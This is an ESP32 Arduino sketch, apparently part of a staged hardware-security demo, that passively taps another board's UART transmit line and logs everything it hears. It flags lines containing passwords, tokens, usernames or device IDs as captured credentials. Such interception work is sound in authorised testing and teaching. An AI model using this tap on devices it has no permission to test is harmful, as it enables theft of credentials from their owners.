/*
 * sniffer.ino — Phase 2: "The Tap"
 *
 * Passive UART listener. Taps the sensor node's TX line
 * and dumps everything to USB serial with timestamps.
 * Highlights lines containing credentials.
 *
 * Wiring:
 *   Sensor ESP32 GPIO 17 (TX2) → This ESP32 GPIO 16 (RX2)
 *   Common GND between boards
 *   This board connected to laptop via USB for serial monitor
 *
 *   That's it. One wire + ground = full access.
 *
 * No libraries required beyond ESP32 board package.
 */

#define UART2_TX  17
#define UART2_RX  16
#define BAUD_RATE 9600

unsigned long startTime;

void setup() {
  Serial.begin(115200);

  // UART2 in receive-only mode — we never transmit, just listen
  Serial2.begin(BAUD_RATE, SERIAL_8N1, UART2_RX, UART2_TX);

  startTime = millis();

  Serial.println();
  Serial.println("===================================");
  Serial.println("  UART SNIFFER v1.0");
  Serial.println("  Phase 2: The Tap");
  Serial.println("===================================");
  Serial.println("Listening on GPIO 16 (RX2) at 9600 baud");
  Serial.println("Waiting for data...");
  Serial.println();
}

bool isSensitive(String &line) {
  // Flag lines that contain credentials or auth tokens
  return (line.indexOf("PASS") >= 0 ||
          line.indexOf("TOKEN") >= 0 ||
          line.indexOf("USER") >= 0 ||
          line.indexOf("AUTH") >= 0 ||
          line.indexOf("DEVICE_ID") >= 0);
}

void loop() {
  if (Serial2.available()) {
    String captured = Serial2.readStringUntil('\n');
    captured.trim();

    if (captured.length() > 0) {
      // Timestamp in seconds since boot
      float elapsed = (millis() - startTime) / 1000.0;

      if (isSensitive(captured)) {
        // Highlight sensitive data
        Serial.print("[");
        Serial.print(elapsed, 1);
        Serial.print("s] *** CAPTURED: ");
        Serial.print(captured);
        Serial.println(" ***");
      } else {
        Serial.print("[");
        Serial.print(elapsed, 1);
        Serial.print("s] ");
        Serial.println(captured);
      }
    }
  }
}
